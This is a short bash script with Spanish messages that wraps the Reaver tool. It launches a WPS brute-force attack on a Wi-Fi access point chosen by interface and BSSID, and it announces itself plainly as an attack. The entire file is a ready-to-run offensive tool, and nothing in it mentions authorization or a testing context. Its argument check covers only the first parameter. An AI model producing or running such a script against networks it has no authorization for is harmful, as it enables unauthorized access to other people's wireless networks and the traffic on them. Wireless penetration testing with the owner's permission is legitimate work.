#!/bin/bash

if [ -z "$1" ]; then
    echo "Uso: $0 <interface> <bssid>"
    exit 1
fi

INTERFACE=$1
BSSID=$2

echo "Iniciando ataque Reaver en $BSSID usando la interfaz $INTERFACE"
sudo reaver -i $INTERFACE -b $BSSID -vv

echo "Ataque Reaver completado."
